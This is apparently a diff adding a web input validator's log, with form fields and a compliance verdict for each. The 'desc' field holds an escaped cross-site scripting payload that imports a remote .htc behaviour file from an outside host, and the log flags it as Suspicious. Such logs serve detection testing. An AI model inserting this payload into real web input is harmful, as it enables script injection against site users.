@@ -1,0 +1,11 @@
+2016-06-24T08:20:11.814-06:00
+name : nLv:W'.sz1.l' F'
+desc : &lt;html xmlns:xss&gt;&lt;?import namespace="xss" implementation="httP://ha.ckers.org/xss.htc"&gt;&lt;xss:xss&gt;xss&lt;/xss:xss&gt;&lt;/html&gt;
+end : 19.07.2016
+budget : 1,667
+assignto[] : 1
+assignme : 1
+The parameter: name :  having value: nLv:W'.sz1.l' F' is: Compliant
+The parameter: desc :  having value: &lt;html xmlns:xss&gt;&lt;?import namespace="xss" implementation="httP://ha.ckers.org/xss.htc"&gt;&lt;xss:xss&gt;xss&lt;/xss:xss&gt;&lt;/html&gt; is: Suspicious
+The parameter: end :  having value: 19.07.2016 is: Compliant
+The parameter: budget :  having value: 1,667 is: Compliant
